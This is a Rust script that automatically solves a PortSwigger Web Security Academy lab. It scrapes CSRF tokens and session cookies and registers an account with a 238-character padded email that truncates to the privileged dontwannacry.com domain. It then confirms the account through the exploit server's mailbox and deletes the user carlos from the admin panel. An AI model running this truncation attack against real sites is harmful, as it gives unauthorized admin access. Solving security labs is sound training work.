/**********************************************************************************
*
* Lab: Inconsistent handling of exceptional input
*
* Hack Steps: 
*      1. Fetch the register page
*      2. Extract the csrf token and session cookie to register a new account
*      3. Register a new account Register a new account with a suitable offset
*         and dontwannacry.com before the real domain
*      4. Fetch the email client
*      5. Extract the link of account registration
*      6. Complete the account registration by following the link
*      7. Fetch the login page
*      8. Extract the csrf token and session cookie to login
*      9. Login to the new account
*      10. Delete carlos from the admin panel
*
***********************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

const LAB_URL: &str = "https://0a94006e0405509581747ff9001000d7.web-security-academy.net"; // Change this to your lab URL
const EXPLOIT_DOMAIN: &str = "exploit-0ae900d5046f506981037e01012d0005.exploit-server.net"; // Change this to your exploit DOMAIN
const NEW_USERNAME: &str = "attacker"; // You can change this to what you want
const NEW_PASSWORD: &str = "hacking"; // You can change this to what you want

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the register page.. ");
    flush_terminal();

    let register_page = fetch(&format!("{LAB_URL}/register"));

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token and session cookie to register a new account.. ");
    flush_terminal();

    let mut session = get_session_cookie(&register_page);
    let mut csrf_token = get_csrf_token(register_page);

    println!("{}", "OK".green());
    print!(
        "⦗3⦘ Registering a new account with a suitable offset and dontwannacry.com before the real domain.. "
    );
    flush_terminal();

    register_new_account(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗4⦘ Fetching the email client.. ",);
    flush_terminal();

    let email_client = fetch(&format!("https://{EXPLOIT_DOMAIN}/email"));

    println!("{}", "OK".green());
    print!("{}", "⦗5⦘ Extracting the link of account registration.. ",);
    flush_terminal();

    let body = email_client.text().unwrap();
    let registration_link = capture_pattern_from_text(">(https.*)</a>", &body);

    println!("{}", "OK".green());
    print!("⦗6⦘ Completing the account registration by following the link.. ");
    flush_terminal();

    fetch(&registration_link);

    println!("{}", "OK".green());
    print!("⦗7⦘ Fetching the login page.. ",);
    flush_terminal();

    let login_page = fetch(&format!("{LAB_URL}/login"));

    println!("{}", "OK".green());
    print!("⦗8⦘ Extracting the csrf token and session cookie to login.. ");
    flush_terminal();

    session = get_session_cookie(&login_page);
    csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗9⦘ Logging in to the new account.. ");
    flush_terminal();

    let login = login_to_the_new_account(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗10⦘ Deleting carlos from the admin panel.. ",);
    flush_terminal();

    session = get_session_cookie(&login);
    fetch_with_session(&format!("{LAB_URL}/admin/delete?username=carlos"), &session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(path)
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn register_new_account(session: &str, csrf_token: &str) -> Response {
    let offset = "a".repeat(238);
    let malicious_email = &format!("{offset}@dontwannacry.com.{EXPLOIT_DOMAIN}");
    WEB_CLIENT
        .post(format!("{LAB_URL}/register"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", NEW_USERNAME),
            ("password", NEW_PASSWORD),
            ("csrf", &csrf_token),
            ("email", &malicious_email),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to register new account".red()))
}

fn login_to_the_new_account(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", NEW_USERNAME),
            ("password", NEW_PASSWORD),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("⦗!⦘ Failed to login as {}", NEW_USERNAME.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(path)
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
